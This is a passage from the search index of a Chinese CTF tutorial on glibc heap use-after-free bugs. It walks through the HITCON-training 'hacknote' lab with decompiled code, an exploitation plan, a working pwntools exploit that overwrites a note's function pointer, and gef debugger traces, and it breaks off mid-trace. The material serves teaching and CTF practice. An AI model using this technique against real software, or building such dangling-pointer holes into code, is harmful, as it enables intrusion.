{ printf ( \"call print my name \\n \" ); } int main () { NAME * a ; a = ( NAME * ) malloc ( sizeof ( struct name )); a -> func = myprint ; a -> myname = \"I can also use it\" ; a -> func ( \"this is my function\" ); // free without modify free ( a ); a -> func ( \"I can also use it\" ); // free with modify a -> func = printmyname ; a -> func ( \"this is my function\" ); // set NULL a = NULL ; printf ( \"this pogram will crash... \\n \" ); a -> func ( \"can not be printed...\" ); } \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u279c use_after_free git:(use_after_free) \u2717 ./use_after_free this is my function I can also use it call print my name this pogram will crash... [1] 38738 segmentation fault (core dumped) ./use_after_free","title":"\u539f\u7406"},{"location":"Pwn/glibc-heap/use_after_free/#_2","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 HITCON-training \u4e2d\u7684 lab 10 hacknote \u4e3a\u4f8b\u3002","title":"\u4f8b\u5b50"},{"location":"Pwn/glibc-heap/use_after_free/#_3","text":"\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6709\u4e2a menu \u51fd\u6570\uff0c\u5176\u4e2d\u6709 puts ( \" 1. Add note \" ); puts ( \" 2. Delete note \" ); puts ( \" 3. Print note \" ); puts ( \" 4. Exit \" ); \u6545\u800c\u7a0b\u5e8f\u5e94\u8be5\u4e3b\u8981\u6709 3 \u4e2a\u529f\u80fd\u3002\u4e4b\u540e\u7a0b\u5e8f\u4f1a\u6839\u636e\u7528\u6237\u7684\u8f93\u5165\u6267\u884c\u76f8\u5e94\u7684\u529f\u80fd\u3002","title":"\u529f\u80fd\u5206\u6790"},{"location":"Pwn/glibc-heap/use_after_free/#add_note","text":"\u6839\u636e\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u6700\u591a\u53ef\u4ee5\u6dfb\u52a0 5 \u4e2a note\u3002\u6bcf\u4e2a note \u6709\u4e24\u4e2a\u5b57\u6bb5 put \u4e0e content\uff0c\u5176\u4e2d put \u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u4f1a\u8f93\u51fa content \u5177\u4f53\u7684\u5185\u5bb9\u3002 unsigned int add_note () { note * v0 ; // ebx signed int i ; // [esp+Ch] [ebp-1Ch] int size ; // [esp+10h] [ebp-18h] char buf ; // [esp+14h] [ebp-14h] unsigned int v5 ; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword ( 0x14u ); if ( count <= 5 ) { for ( i = 0 ; i <= 4 ; ++ i ) { if ( ! notelist [ i ] ) { notelist [ i ] = malloc ( 8u ); if ( ! notelist [ i ] ) { puts ( \"Alloca Error\" ); exit ( -1 ); } notelist [ i ] -> put = print_note_content ; printf ( \"Note size :\" ); read ( 0 , & buf , 8u ); size = atoi ( & buf ); v0 = notelist [ i ]; v0 -> content = malloc ( size ); if ( ! notelist [ i ] -> content ) { puts ( \"Alloca Error\" ); exit ( -1 ); } printf ( \"Content :\" ); read ( 0 , notelist [ i ] -> content , size ); puts ( \"Success !\" ); ++ count ; return __readgsdword ( 0x14u ) ^ v5 ; } } } else { puts ( \"Full\" ); } return __readgsdword ( 0x14u ) ^ v5 ; }","title":"add_note"},{"location":"Pwn/glibc-heap/use_after_free/#print_note","text":"print_note \u5c31\u662f\u7b80\u5355\u7684\u6839\u636e\u7ed9\u5b9a\u7684 note \u7684\u7d22\u5f15\u6765\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15\u7684 note \u7684\u5185\u5bb9\u3002 unsigned int print_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) notelist [ v1 ] -> put ( notelist [ v1 ]); return __readgsdword ( 0x14u ) ^ v3 ; }","title":"print_note"},{"location":"Pwn/glibc-heap/use_after_free/#delete_note","text":"delete_note \u4f1a\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\u6765\u91ca\u653e\u5bf9\u5e94\u7684 note\u3002\u4f46\u662f\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728 \u5220\u9664\u7684\u65f6\u5019\uff0c\u53ea\u662f\u5355\u7eaf\u8fdb\u884c\u4e86 free\uff0c\u800c\u6ca1\u6709\u8bbe\u7f6e\u4e3a NULL\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u8fd9\u91cc\u662f\u5b58\u5728 Use After Free \u7684\u60c5\u51b5\u7684\u3002 unsigned int del_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) { free ( notelist [ v1 ] -> content ); free ( notelist [ v1 ]); puts ( \"Success\" ); } return __readgsdword ( 0x14u ) ^ v3 ; }","title":"delete_note"},{"location":"Pwn/glibc-heap/use_after_free/#_4","text":"\u6211\u4eec\u53ef\u4ee5\u770b\u5230 Use After Free \u7684\u60c5\u51b5\u786e\u5b9e\u53ef\u80fd\u4f1a\u53d1\u751f\uff0c\u90a3\u4e48\u600e\u4e48\u53ef\u4ee5\u8ba9\u5b83\u53d1\u751f\u5e76\u4e14\u8fdb\u884c\u5229\u7528\u5462\uff1f\u9700\u8981\u540c\u65f6\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u8fd8\u6709\u4e00\u4e2a magic \u51fd\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u901a\u8fc7 use after free \u6765\u4f7f\u5f97\u8fd9\u4e2a\u7a0b\u5e8f\u6267\u884c magic \u51fd\u6570\u5462\uff1f \u4e00\u4e2a\u5f88\u76f4\u63a5\u7684\u60f3\u6cd5\u662f\u4fee\u6539 note \u7684 put \u5b57\u6bb5\u4e3a magic \u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u5728\u6267\u884c print note \u7684\u65f6\u5019\u6267\u884c magic \u51fd\u6570\u3002 \u90a3\u4e48\u8be5\u600e\u4e48\u6267\u884c\u5462\uff1f \u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u6765\u770b\u4e00\u4e0b\u6bcf\u4e00\u4e2a note \u751f\u6210\u7684\u5177\u4f53\u6d41\u7a0b \u7a0b\u5e8f\u7533\u8bf7 8 \u5b57\u8282\u5185\u5b58\u7528\u6765\u5b58\u653e note \u4e2d\u7684 put \u4ee5\u53ca content \u6307\u9488\u3002 \u7a0b\u5e8f\u6839\u636e\u8f93\u5165\u7684 size \u6765\u7533\u8bf7\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u7136\u540e\u7528\u6765\u5b58\u50a8 content\u3002 +-----------------+ | put | +-----------------+ | content | size +-----------------+------------------->+----------------+ | real | | content | | | +----------------+ \u90a3\u4e48\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5728\u5806\u7684\u5b9e\u73b0\u4e2d\u6240\u5b66\u5230\u7684\uff0c\u663e\u7136 note \u662f\u4e00\u4e2a fastbin chunk\uff08\u5927\u5c0f\u4e3a 16 \u5b57\u8282\uff09\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5e0c\u671b\u4e00\u4e2a note \u7684 put \u5b57\u6bb5\u4e3a magic \u7684\u51fd\u6570\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5fc5\u987b\u60f3\u529e\u6cd5\u8ba9\u67d0\u4e2a note \u7684 put \u6307\u9488\u88ab\u8986\u76d6\u4e3a magic \u5730\u5740\u3002\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u53ea\u6709\u552f\u4e00\u7684\u5730\u65b9\u5bf9 put \u8fdb\u884c\u8d4b\u503c\u3002\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5229\u7528\u5199 real content \u7684\u65f6\u5019\u6765\u8fdb\u884c\u8986\u76d6\u3002\u5177\u4f53\u91c7\u7528\u7684\u601d\u8def\u5982\u4e0b \u7533\u8bf7 note0\uff0creal content size \u4e3a 16\uff08\u5927\u5c0f\u4e0e note \u5927\u5c0f\u6240\u5728\u7684 bin \u4e0d\u4e00\u6837\u5373\u53ef\uff09 \u7533\u8bf7 note1\uff0creal content size \u4e3a 16\uff08\u5927\u5c0f\u4e0e note \u5927\u5c0f\u6240\u5728\u7684 bin \u4e0d\u4e00\u6837\u5373\u53ef\uff09 \u91ca\u653e note0 \u91ca\u653e note1 \u6b64\u65f6\uff0c\u5927\u5c0f\u4e3a 16 \u7684 fast bin chunk \u4e2d\u94fe\u8868\u4e3a note1->note0 \u7533\u8bf7 note2\uff0c\u5e76\u4e14\u8bbe\u7f6e real content \u7684\u5927\u5c0f\u4e3a 8\uff0c\u90a3\u4e48\u6839\u636e\u5806\u7684\u5206\u914d\u89c4\u5219 note2 \u5176\u5b9e\u4f1a\u5206\u914d note1 \u5bf9\u5e94\u7684\u5185\u5b58\u5757\u3002 real content \u5bf9\u5e94\u7684 chunk \u5176\u5b9e\u662f note0\u3002 \u5982\u679c\u6211\u4eec\u8fd9\u65f6\u5019\u5411 note2 real content \u7684 chunk \u90e8\u5206\u5199\u5165 magic \u7684\u5730\u5740\uff0c\u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u6ca1\u6709 note0 \u4e3a NULL\u3002\u5f53\u6211\u4eec\u518d\u6b21\u5c1d\u8bd5\u8f93\u51fa note0 \u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8c03\u7528 magic \u51fd\u6570\u3002","title":"\u5229\u7528\u5206\u6790"},{"location":"Pwn/glibc-heap/use_after_free/#_5","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './hacknote' ) def addnote ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def delnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) def printnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) #gdb.attach(r) magic = 0x08048986 addnote ( 32 , \"aaaa\" ) # add note 0 addnote ( 32 , \"ddaa\" ) # add note 1 delnote ( 0 ) # delete note 0 delnote ( 1 ) # delete note 1 addnote ( 8 , p32 ( magic )) # add note 2 printnote ( 0 ) # print note 0 r . interactive () \u6211\u4eec\u53ef\u4ee5\u5177\u4f53\u770b\u4e00\u4e0b\u6267\u884c\u7684\u6d41\u7a0b\uff0c\u9996\u5148\u5148\u4e0b\u65ad\u70b9 \u4e24\u5904 malloc \u4e0b\u65ad\u70b9 gef\u27a4 b *0x0804875C Breakpoint 1 at 0x804875c gef\u27a4 b *0x080486CA Breakpoint 2 at 0x80486ca \u4e24\u5904 free \u4e0b\u65ad\u70b9 gef\u27a4 b *0x08048893 Breakpoint 3 at 0x8048893 gef\u27a4 b *0x080488A9 Breakpoint 4 at 0x80488a9 \u7136\u540e\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7533\u8bf7 note0 \u65f6\uff0c\u6240\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5757\u5730\u5740\u4e3a 0x0804b008\u3002\uff08eax \u5b58\u50a8\u51fd\u6570\u8fd4\u56de\u503c\uff09 $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x00000000 $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x080486cf \u2192 <add_note+89> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x80486c2 <add_note+76> add DWORD PTR [eax], eax 0x80486c4 <add_note+78> add BYTE PTR [ebx+0x86a0cec], al 0x80486ca <add_note+84> call 0x80484e0 <malloc@plt> \u2192 0x80486cf <add_note+89> add esp, 0x10 0x80486d2 <add_note+92> mov edx, eax 0x80486d4 <add_note+94> mov eax, DWORD PTR [ebp-0x1c] 0x80486d7 <add_note+97> mov DWORD PTR [eax*4+0x804a070], edx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf10', 'l8'] 8 0xffffcf10\u2502+0x00: 0x00000008 \u2190 $esp 0xffffcf14\u2502+0x04: 0x00000000 0xffffcf18\u2502+0x08: 0xf7e29ef5 \u2192 <strtol+5> add eax, 0x18210b 0xffffcf1c\u2502+0x0c: 0xf7e27260 \u2192 <atoi+16> add esp, 0x1c 0xffffcf20\u2502+0x10: 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0xffffcf24\u2502+0x14: 0x00000000 0xffffcf28\u2502+0x18: 0x0000000a 0xffffcf2c\u2502+0x1c: 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 ---Type <return> to continue, or q <return> to quit--- [#0] 0x80486cf \u2192 Name: add_note() [#1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 heap chunk 0x0804b008 UsedChunk(addr=0x804b008, size=0x10) Chunk size: 16 (0x10) Usable size: 12 (0xc) Previous chunk size: 0 (0x0) PREV_INUSE flag: On IS_MMAPPED flag: Off NON_MAIN_ARENA flag: Off \u7533\u8bf7 note 0 \u7684 content \u7684\u5730\u5740\u4e3a 0x0804b018 $eax : 0x0804b018 \u2192 0x00000000 $ebx : 0x0804b008 \u2192 0x0804865b \u2192 <print_note_content+0> push ebp $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b018 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000020 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x08048761 \u2192 <add_note+235> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x8048752 <add_note+220> mov al, ds:0x458b0804 0x8048757 <add_note+225> call 0x581173df 0x804875c <add_note+230> call 0x80484e0 <malloc@plt> \u2192 0x8048761 <add_note+235> add esp, 0x10 0x8048764 <add_note+238> mov DWORD PTR [ebx+0x4], eax 0x8048767 <add_note+241> mov eax, DWORD PTR [ebp-0x1c] 0x804876a <add_note+244> mov eax, DWORD PTR [eax*4+0x804a070] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf10', 'l8'] 8 0xffffcf10\u2502+0x00: 0x00000020 \u2190 $esp 0xffffcf14\u2502+0x04: 0xffffcf34 \u2192 0xf70a3233 0xffffcf18\u2502+0x08: 0x00000008 0xffffcf1c\u2502+0x0c: 0xf7e27260 \u2192 <atoi+16> add esp, 0x1c 0xffffcf20\u2502+0x10: 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0xffffcf24\u2502+0x14: 0x00000000 0xffffcf28\u2502+0x18: 0x0000000a 0xffffcf2c\u2502+0x1c: 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 ---Type <return> to continue, or q <return> to quit--- [#0] 0x8048761 \u2192 Name: add_note() [#1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 heap chunk 0x0804b018 UsedChunk(addr=0x804b018, size=0x28) Chunk size: 40 (0x28) Usable size: 36 (0x24) Previous chunk size: 0 (0x0) PREV_INUSE flag: On IS_MMAPPED flag: Off NON_MAIN_ARENA flag: Off \u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230 note1 \u7684\u5730\u5740\u4ee5\u53ca\u5176 content \u7684\u5730\u5740\u5206\u522b\u4e3a 0x0804b040 \u548c 0x0804b050\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u770b\u5230 note0 \u4e0e note1 \u5bf9\u5e94\u7684 content \u786e\u5b9e\u662f\u76f8\u5e94\u7684\u5185\u5b58\u5757\u3002 gef\u27a4 grep aaaa [+] Searching 'aaaa' in memory [+] In '[heap]'(0x804b000-0x806c000), permission=rw- 0x804b018 - 0x804b01c \u2192 \"aaaa\" gef\u27a4 grep ddaa [+] Searching 'ddaa' in memory [+] In '[heap]'(0x804b000-0x806c000), permission=rw- 0x804b050 - 0x804b054 \u2192 \"ddaa\" \u4e0b\u9762\u5c31\u662f free \u7684\u8fc7\u7a0b\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u53d1\u73b0\u9996\u5148\uff0cnote0 \u7684 content \u88ab free \u2192 0x8048893 <del_note+143> call 0x80484c0 <free@plt> \u21b3 0x80484c0 <free@plt+0> jmp DWORD PTR ds:0x804a018 0x80484c6 <free@plt+6> push 0x18 0x80484cb <free@plt+11> jmp 0x8048480 0x80484d0 <__stack_chk_fail@plt+0> jmp DWORD PTR ds:0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf20', 'l8'] 8 0xffffcf20\u2502+0x00: 0x0804b018 \u2192 \"aaaa\" \u2190 $esp \u7136\u540e\u662f note0 \u672c\u8eab \u2192 0x80488a9 <del_note+165> call 0x80484c0 <free@plt> \u21b3 0x80484c0 <free@plt+0> jmp DWORD PTR ds:0x804a018 0x80484c6 <free@plt+6> push 0x18 0x80484cb <free@plt+11> jmp 0x8048480 0x80484d0 <__stack_chk_fail@plt+0> jmp DWORD PTR ds:0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf20', 